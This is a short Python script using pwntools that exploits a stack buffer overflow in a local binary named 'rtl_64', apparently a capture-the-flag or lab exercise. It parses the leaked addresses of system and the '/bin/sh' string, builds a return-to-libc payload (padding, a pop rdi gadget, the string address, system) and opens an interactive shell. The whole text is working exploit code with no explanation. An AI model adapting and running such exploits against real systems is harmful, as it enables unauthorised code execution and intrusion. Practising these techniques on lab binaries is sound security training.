from pwn import*

p = process('./rtl_64')

p.recvuntil('system : ')
system = int(p.recv(14),16)
p.recvuntil('binsh : ')
binsh = int(p.recv(8),16)

print(hex(system))
print(hex(binsh))

payload = ''
payload += 'A'*0x80
payload += 'C'*8
payload += p64(0x00000000004007a3)
payload += p64(binsh)
payload += p64(system)

p.sendline(payload)

p.interactive()
